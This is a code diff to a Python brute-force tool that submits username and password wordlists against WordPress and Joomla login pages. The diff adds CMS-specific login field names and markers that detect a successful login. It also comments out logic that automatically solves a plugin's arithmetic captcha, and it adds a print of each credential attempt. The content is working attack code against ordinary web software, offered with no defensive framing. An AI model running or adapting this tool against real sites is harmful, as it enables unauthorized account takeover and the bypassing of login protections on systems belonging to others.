@@ -8,11 +8,12 @@ from html.parser import HTMLParser
 
 
 class Bruter(object):
-    def __init__(self, target_url = None, username=None, passwords_list=None, usernames_list = None, user_threads=1, resume = None):
+    def __init__(self, target_url = None, username=None, passwords_list=None, usernames_list = None, user_threads=1, cms=None, resume = None):
         self.target_url = target_url
         self.target_post = target_url
         self.username = username
         self.found = False
+        self.cms = cms
         self.resume = resume
         self.password_q = self.build_wordlist(passwords_list)
         self.username_q = self.build_wordlist(usernames_list)
@@ -23,9 +24,15 @@ class Bruter(object):
         self.set_cms()
     
     def set_cms(self):
-        self.username_field= "log"
-        self.password_field= "pwd"
-        self.success_check = "Dashboard"
+        if self.cms == 'wordpress':
+            self.username_field= "log"
+            self.password_field= "pwd"
+            self.success_check = "Dashboard"
+
+        elif self.cms == 'joomla':
+            self.username_field= "username"
+            self.password_field= "passwd"
+            self.success_check = "Control Panel"
 
     def get_discovered_usernames(self):
         return self.discovered_usernames
@@ -78,16 +85,16 @@ class Bruter(object):
 
             #check if captch block was found
             #and set up the values
-            if parser.data_captcha_block:
-                #create and fill the captcha handler
-                captcha_handler = CaptchaHandler()
-                captcha_handler.value1 = parser.data_captcha_block[3]
-                captcha_handler.value2 = parser.data_captcha_block[4].replace('=','')
-                captcha_handler.operator = parser.charref_captcha_block or parser.entityref_captcha_block 
+       #     if parser.data_captcha_block:
+       #         #create and fill the captcha handler
+       #         captcha_handler = CaptchaHandler()
+       #         captcha_handler.value1 = parser.data_captcha_block[3]
+       #         captcha_handler.value2 = parser.data_captcha_block[4].replace('=','')
+       #         captcha_handler.operator = parser.charref_captcha_block or parser.entityref_captcha_block 
 
-                #compute the captcha value
-                captcha_value = captcha_handler.compute_captcha_value()
-                post_tags['ux_txt_captcha_input'] = captcha_value
+       #         #compute the captcha value
+       #         captcha_value = captcha_handler.compute_captcha_value()
+       #         post_tags['ux_txt_captcha_input'] = captcha_value
 
 
             # add our username and password fields
@@ -97,6 +104,7 @@ class Bruter(object):
             #login_data = urllib.urlencode(post_tags)
 
             login_response = session.post(self.target_post, data=post_tags)
+            print(post_tags)
 
             # print the html returned or something more intelligent to see if it's a successful login page.
             login_result = login_response.text
@@ -186,27 +194,13 @@ class Bruter(object):
 
 
 class BruteParser(HTMLParser):
-    '''Class that will check the HTML code from the retrieved
-        and get the hidden parameter to repost.
-        It can also deal with some captcha.'''
-
     def __init__(self):
         HTMLParser.__init__(self)
         self.tag_results = {}
-        self.tag = ""
-        self.captcha_block = False
-        self.data_captcha_block = []
-        self.entityref_captcha_block = ''
-        self.charref_captcha_block = ''
 
+    #This method is automaticaly called during self.feed()
     def handle_starttag(self, tag, attrs):
-        '''check for the star tags, to get the input values
-            and check if a captcha is present'''
-
-        #here, we store the input values in a dictionary
-        #to resubmit them
         if tag == "input":
-            self.tag == "input"
             tag_name = None
             tag_value = None
             for name,value in attrs:
@@ -216,44 +210,75 @@ class BruteParser(HTMLParser):
                     tag_value = value
             if tag_name is not None:
                 self.tag_results[tag_name] = value
-
-        #check if this tag contains the captcha block
-        #starting point to spot some captcha
-        if tag == 'p':
-            for name, value in attrs:
-                #check whether we enter the captach block to 
-                #to analyse it
-                if name == 'class' and value == 'cptch_block':
-                    self.captcha_block = True
-
-
-    def handle_endtag(self, tag):
-        #if we see closing tag p, means we are out of
-        #captcha block
-        if tag =='p':
-            self.captcha_block = False
-
-    def handle_data(self, data):
-        '''capturing data. If we are in the captcha block, 
-            only the indeces 3 and 4 are of interest for the calculation
-            of the captcha value'''
-
-        #if we are in captcha block we capture the data
-        if self.captcha_block:
-            #only the index 3 and 4 are useful, the rest is garbage
-            self.data_captcha_block.append(data)
-
-    def handle_entityref(self, entity):
-        '''check some entityref. That is how the operator
-            for logical captcha is encoded'''
-        if self.captcha_block:
-            self.entityref_captcha_block = entity
-
-    def handle_charref(self, char):
-        '''check some entityref. That is how the operator
-            for logical captcha is encoded'''
-        if self.captcha_block:
-            self.charref_captcha_block = char
+#class BruteParser(HTMLParser):
+#    '''Class that will check the HTML code from the retrieved
+#        and get the hidden parameter to repost.
+#        It can also deal with some captcha.'''
+#
+#    def __init__(self):
+#        HTMLParser.__init__(self)
+#        self.tag_results = {}
+#        self.tag = ""
+#        self.captcha_block = False
+#        self.data_captcha_block = []
+#        self.entityref_captcha_block = ''
+#        self.charref_captcha_block = ''
+#
+#    def handle_starttag(self, tag, attrs):
+#        '''check for the star tags, to get the input values
+#            and check if a captcha is present'''
+#
+#        #here, we store the input values in a dictionary
+#        #to resubmit them
+#        if tag == "input":
+#            self.tag == "input"
+#            tag_name = None
+#            tag_value = None
+#            for name,value in attrs:
+#                if name == "name":
+#                    tag_name = value
+#                if name == "value":
+#                    tag_value = value
+#            if tag_name is not None:
+#                self.tag_results[tag_name] = value
+#
+#        #check if this tag contains the captcha block
+#        #starting point to spot some captcha
+#        if tag == 'p':
+#            for name, value in attrs:
+#                #check whether we enter the captach block to 
+#                #to analyse it
+#                if name == 'class' and value == 'cptch_block':
+#                    self.captcha_block = True
+#
+#
+#    def handle_endtag(self, tag):
+#        #if we see closing tag p, means we are out of
+#        #captcha block
+#        if tag =='p':
+#            self.captcha_block = False
+#
+#    def handle_data(self, data):
+#        '''capturing data. If we are in the captcha block, 
+#            only the indeces 3 and 4 are of interest for the calculation
+#            of the captcha value'''
+#
+#        #if we are in captcha block we capture the data
+#        if self.captcha_block:
+#            #only the index 3 and 4 are useful, the rest is garbage
+#            self.data_captcha_block.append(data)
+#
+#    def handle_entityref(self, entity):
+#        '''check some entityref. That is how the operator
+#            for logical captcha is encoded'''
+#        if self.captcha_block:
+#            self.entityref_captcha_block = entity
+#
+#    def handle_charref(self, char):
+#        '''check some entityref. That is how the operator
+#            for logical captcha is encoded'''
+#        if self.captcha_block:
+#            self.charref_captcha_block = char
 
 class CaptchaHandler:
     ''' Class to handle the captcha from the Captcha Bank plugin
